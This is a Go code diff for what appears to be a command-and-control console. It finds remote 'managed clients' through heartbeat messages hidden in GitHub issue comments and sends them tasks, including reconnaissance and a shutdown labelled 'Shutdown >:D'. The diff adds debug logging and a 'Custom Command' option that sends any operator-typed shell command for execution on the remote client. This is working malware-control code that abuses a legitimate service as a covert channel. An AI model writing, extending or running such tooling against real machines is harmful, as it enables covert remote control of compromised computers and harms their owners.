@@ -59,6 +59,11 @@ func discoverClients() ([]ManagedClient, error) {
 
 		// receive comments to find heartbeat
 		comments, err := listComments(issue.Number)
+		fmt.Printf(
+			"[DEBUG] Issue #%d returned %d comments\n",
+			issue.Number,
+			len(comments),
+		)
 		if err != nil {
 			fmt.Printf(
 				"Could not read Issue #%d: %v\n",
@@ -75,37 +80,64 @@ func discoverClients() ([]ManagedClient, error) {
 		for i := len(comments) - 1; i >= 0; i-- {
 			message, err := parseGundoMessage(comments[i].Body)
 			if err != nil {
+				// fmt.Printf(
+				// 	"[DEBUG] Issue #%d comment %d parse failed: %v\n",
+				// 	issue.Number,
+				// 	comments[i].ID,
+				// 	err,
+				// )
 				continue
 			}
+
+			fmt.Printf(
+				"[DEBUG] Issue #%d | Type=%q ClientID=%q Timestamp=%q\n",
+				issue.Number,
+				message.Type,
+				message.ClientID,
+				message.Timestamp,
+			)
 
 			if message.Type != "heartbeat" {
 				continue
 			}
 
+			fmt.Printf(
+				"[DEBUG] Heartbeat found. Expected client=%q Received client=%q\n",
+				clientID,
+				message.ClientID,
+			)
+
 			if message.ClientID != clientID {
+				fmt.Println("[DEBUG] Client IDs DO NOT match")
 				continue
 			}
 
-			//format heartbeat time that could be understood and comared later
 			heartbeatTime, err := time.Parse(
 				time.RFC3339,
 				message.Timestamp,
 			)
-
 			if err != nil {
+				fmt.Printf(
+					"[DEBUG] Heartbeat timestamp parse failed: %v\n",
+					err,
+				)
 				continue
 			}
 
-			// the last seen time goes to managedclient struct
+			age := time.Since(heartbeatTime)
+
+			fmt.Printf(
+				"[DEBUG] Heartbeat age=%s threshold=%s\n",
+				age,
+				offlineThreshold,
+			)
+
 			managedClient.LastSeen = heartbeatTime
 
-			// compares current time to the stored heartbeatime do determine online status
-			if time.Since(heartbeatTime) < offlineThreshold {
+			if age < offlineThreshold {
 				managedClient.Online = true
 			}
 
-			// We searched backwards, so this is the
-			// newest heartbeat. Stop searching.
 			break
 		}
 
@@ -219,6 +251,7 @@ func runCommandMenu(reader *bufio.Reader, client ManagedClient) {
 		fmt.Println("3. Get OS")
 		fmt.Println("4. Get User")
 		fmt.Println("5. Shutdown >:D")
+		fmt.Println("6. Custom Command")
 		fmt.Println("0. Back")
 		fmt.Print("\nSelect command: ")
 
@@ -233,6 +266,7 @@ func runCommandMenu(reader *bufio.Reader, client ManagedClient) {
 
 		// determine action
 		var action string
+		var command string
 
 		switch choice {
 		case "1":
@@ -250,6 +284,20 @@ func runCommandMenu(reader *bufio.Reader, client ManagedClient) {
 		case "5":
 			action = "shutdown"
 
+		case "6":
+			action = "custom"
+			fmt.Print("\nEnter shell command: ")
+			raw, err := reader.ReadString('\n')
+			if err != nil {
+				fmt.Printf("Error reading command: %v\n", err)
+				continue
+			}
+			command = strings.TrimSpace(raw)
+			if command == "" {
+				fmt.Println("Empty command, aborted.")
+				continue
+			}
+
 		case "0":
 			return
 
@@ -262,6 +310,7 @@ func runCommandMenu(reader *bufio.Reader, client ManagedClient) {
 		// client ID of the passed in client
 		task := createTaskMessage(action)
 		task.TargetClientID = client.ClientID
+		task.Command = command
 
 		fmt.Printf("\n[+] Sending %s\n", action)
 		fmt.Printf("[+] Task ID: %s\n", task.TaskID)
